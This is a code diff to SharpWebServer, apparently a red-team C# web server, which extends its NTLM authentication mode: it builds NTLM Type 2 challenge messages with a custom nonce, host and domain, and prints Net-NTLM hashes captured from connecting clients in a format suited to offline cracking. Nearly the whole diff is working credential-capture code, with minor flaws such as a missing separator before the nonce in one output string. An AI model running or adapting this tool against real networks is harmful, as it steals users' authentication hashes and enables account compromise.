@@ -866,14 +866,28 @@ namespace SharpWebServer
         private bool _Verbose;
         private bool _NTLM;
         private int _Port;
-
-        public SharpWebServer(string directoryPath, int port, bool ntlm = false, bool verbose = false)
+        private string _ShortName;
+        private string _FQDN;
+        private string _Host;
+        private string _Nonce;
+        public SharpWebServer(string directoryPath, 
+            int port, 
+            bool ntlm = false, 
+            bool verbose = false,
+            string shortname = "SMB",
+            string fqdn = "SMB.local",
+            string host = "SMB",
+            string nonce = "112233445566778")
         {
             _RootDirectory = directoryPath;
             _AllowCors = false;
             _Verbose = verbose;
             _NTLM = ntlm;
             _Port = port;
+            _ShortName = shortname;
+            _FQDN = fqdn;
+            _Host = host;
+            _Nonce = nonce.ToUpper();
         }
 
         private void Initialize()
@@ -1138,7 +1152,7 @@ namespace SharpWebServer
             }
         }
 
-        private static string DecodeNTLM(byte[] NTLM)
+        private static string DecodeNTLM(byte[] NTLM,string nonce)
         {
             var LMHash_len = BitConverter.ToInt16(NTLM, 12);
             var LMHash_offset = BitConverter.ToInt16(NTLM, 16);
@@ -1158,7 +1172,7 @@ namespace SharpWebServer
                 var HostName_offset = BitConverter.ToInt16(NTLM, 48);
                 var HostName = NTLM.Skip(HostName_offset).Take(HostName_len).ToArray();
                 var HostNameString = System.Text.Encoding.Unicode.GetString(HostName);
-                var retval = UserString + "::" + HostNameString + ":" + LMHash + ":" + NTHash + ":1122334455667788";
+                var retval = UserString + "::" + HostNameString + ":" + LMHash + ":" + NTHash + nonce;
                 return retval;
             }
             else if (NTHash_len > 24)
@@ -1176,14 +1190,78 @@ namespace SharpWebServer
 
                 var NTHash_part1 = System.BitConverter.ToString(NTHash.Take(16).ToArray()).Replace("-", "");
                 var NTHash_part2 = BitConverter.ToString(NTHash.Skip(16).Take(NTLM.Length).ToArray()).Replace("-", "");
-                var retval = UserString + "::" + DomainString + ":1122334455667788:" + NTHash_part1 + ":" + NTHash_part2;
+                var retval = UserString + "::" + DomainString + ":" + nonce + ":" + NTHash_part1 + ":" + NTHash_part2;
                 return retval;
             }
 
             Output("[!] SharpWebServer: Could not parse NTLM hash");
             return "";
         }
+        private String build_response()
+        {
+            List<byte> ret = new List<byte>();
+            List<byte> sb1 = new List<byte>();
+            List<byte> sb2 = new List<byte>();
+            List<byte> content = new List<byte>() ;
+            UInt64 flags = 0 ;
 
+            sb1.AddRange(System.BitConverter.GetBytes(Convert.ToInt16(Encoding.Unicode.GetBytes(_Host).Length)));
+            sb1.AddRange(System.BitConverter.GetBytes(Convert.ToInt16(Encoding.Unicode.GetBytes(_Host).Length)));
+            sb1.AddRange(System.BitConverter.GetBytes(Convert.ToInt32(48)));
+            Console.WriteLine(Convert.ToBase64String(sb1.ToArray()));
+
+            // Hostname in upper
+            content.AddRange(System.BitConverter.GetBytes(Convert.ToInt16(1)));
+            content.AddRange(System.BitConverter.GetBytes(Convert.ToInt16(Encoding.Unicode.GetBytes(_Host).Length)));
+            content.AddRange(Encoding.Unicode.GetBytes(_Host.ToUpper()) );
+
+            // Domain in upper
+            content.AddRange(System.BitConverter.GetBytes(Convert.ToInt16(2)));
+            content.AddRange(System.BitConverter.GetBytes(Convert.ToInt16(Encoding.Unicode.GetBytes(_ShortName).Length)));
+            content.AddRange(Encoding.Unicode.GetBytes(_ShortName.ToUpper()));
+
+            // FQDN 
+            content.AddRange(System.BitConverter.GetBytes(Convert.ToInt16(4)));
+            content.AddRange(System.BitConverter.GetBytes(Convert.ToInt16(Encoding.Unicode.GetBytes(_FQDN).Length)));
+            content.AddRange(Encoding.Unicode.GetBytes(_FQDN));
+
+            // DNS Name 
+            content.AddRange(System.BitConverter.GetBytes(Convert.ToInt16(3)));
+            content.AddRange(System.BitConverter.GetBytes(Convert.ToInt16(Encoding.Unicode.GetBytes(_Host + "." + _FQDN).Length)));
+            content.AddRange(Encoding.Unicode.GetBytes(_Host + "." + _FQDN));
+
+            // Closing block
+            content.AddRange(System.BitConverter.GetBytes(Convert.ToInt64(0)));
+
+            sb2.AddRange(System.BitConverter.GetBytes(Convert.ToInt16(content.ToArray().Length)));
+            sb2.AddRange(System.BitConverter.GetBytes(Convert.ToInt16(content.ToArray().Length)));
+            sb2.AddRange(System.BitConverter.GetBytes(Convert.ToInt32(48 + Encoding.Unicode.GetBytes(_FQDN).Length)));
+
+            flags |= 0x00000001; // Negotiate Unicode
+            flags |= 0x00000004; // Request Target
+            flags |= 0x00000200; // Negotiate NTLM
+            flags |= 0x00010000; // Target is domain
+            flags |= 0x00080000; // negotiate Always Sign
+            flags |= 0x00800000; // Negotiate target supplied
+            flags |= 0x20000000; // Netogiate 128 bit security
+            flags |= 0x80000000; // Negotiate 56 bit security
+
+
+
+
+            UInt64 LocalNonce = UInt64.Parse(_Nonce, System.Globalization.NumberStyles.HexNumber);
+            ret.AddRange(ASCIIEncoding.ASCII.GetBytes("NTLMSSP" + char.MinValue)); // NTLMSSP header
+            ret.AddRange(System.BitConverter.GetBytes(Convert.ToInt32(2))); //Type2 message
+            ret.AddRange(sb1.ToArray()); // Security Buffer 1 w info about where to find hostname
+            ret.AddRange(System.BitConverter.GetBytes(flags)); // The flags for negotiation
+            ret.AddRange(System.BitConverter.GetBytes(LocalNonce)); // The challenge string
+            ret.AddRange(System.BitConverter.GetBytes(Convert.ToInt64(0))); // Context (empty)
+            ret.AddRange(sb2.ToArray()); //Security buffer 2 w info about where to find the content data
+            ret.AddRange(Encoding.Unicode.GetBytes(_Host.ToUpper())); // The hostname in upper case
+            ret.AddRange(content.ToArray()); // The content block
+            Console.WriteLine(Convert.ToBase64String(ret.ToArray()));
+            return Convert.ToBase64String(ret.ToArray());
+        }
         private void Process(ref MyRequest request, ref MyResponse response)
         {
             bool process = true;
@@ -1214,7 +1292,7 @@ namespace SharpWebServer
                         // NTLM type 3 message - client's response
                         if (NTLMHash[8] == 3)
                         {
-                            var NTLMHashString = DecodeNTLM(NTLMHash);
+                            var NTLMHashString = DecodeNTLM(NTLMHash,_Nonce);
                             Output("\n[+] SharpWebServer: Net-NTLM hash captured:");
                             Output(NTLMHashString + "\n");
                             process = true;
@@ -1227,7 +1305,7 @@ namespace SharpWebServer
 
                         response.StatusCode = (int)HttpStatusCode.Unauthorized;
                         response.StatusMessage = "Unauthorized";
-                        response.Headers.Add("WWW-Authenticate", "NTLM TlRMTVNTUAACAAAABgAGADgAAAAFAomiESIzRFVmd4gAAAAAAAAAAIAAgAA+AAAABQLODgAAAA9TAE0AQgACAAYAUwBNAEIAAQAWAFMATQBCAC0AVABPAE8ATABLAEkAVAAEABIAcwBtAGIALgBsAG8AYwBhAGwAAwAoAHMAZQByAHYAZQByADIAMAAwADMALgBzAG0AYgAuAGwAbwBjAGEAbAAFABIAcwBtAGIALgBsAG8AYwBhAGwAAAAAAA==");
+                        response.Headers.Add("WWW-Authenticate", "NTLM " + build_response());
                         response.Headers.Add("Connection", "keep-alive");
                         response.Headers.Add("Content-Length", "0");
                     }
@@ -1959,9 +2037,55 @@ Authors:
                 outputToFile = arguments["logfile"];
             }
 
+            string nonce = "1122334455667788";
+            if (arguments.ContainsKey("nonce"))
+            {
+                if(arguments["nonce"].Length != 16 )
+                {
+                    Output("[-] The Nonce must be exactly a 16 char hex string");
+                    System.Environment.Exit(0);
+                }
+                try
+                {
+                    UInt64 t = UInt64.Parse(arguments["nonce"], System.Globalization.NumberStyles.HexNumber);
+                }
+                catch (IOException e)
+                {
+                    if (e.Source != null)
+                        Console.WriteLine("IOException source: {0}", e.Source);
+                    Output("[-] The Nonce must be exactly a 16 char hex string. Not a valid hex value");
+                    System.Environment.Exit(0);
+                }
+
+                Output("[.] Using a nonce of : " + arguments["nonce"]);
+                nonce = arguments["nonce"];
+            }
+
+            string shortdom = "SMB";
+            if (arguments.ContainsKey("short"))
+            {
+                Output("[.] Using a short domain of : " + arguments["short"]);
+                shortdom = arguments["short"];
+            }
+
+            string fqdn = "SMB.local";
+            if (arguments.ContainsKey("fqdn"))
+            {
+                Output("[.] Using a fqdn domain of : " + arguments["fqdn"]);
+                fqdn = arguments["fqdn"];
+            }
+
+            string host = "SMB";
+            if (arguments.ContainsKey("host"))
+            {
+                Output("[.] Using a hostname of : " + arguments["host"]);
+                host = arguments["host"];
+            }
+
+
             Output("\n");
 
-            var server = new SharpWebServer(dir, port, ntlm, verbose);
+            var server = new SharpWebServer(dir, port, ntlm, verbose, shortdom, fqdn, host, nonce);
 
             server.Initialize();
 
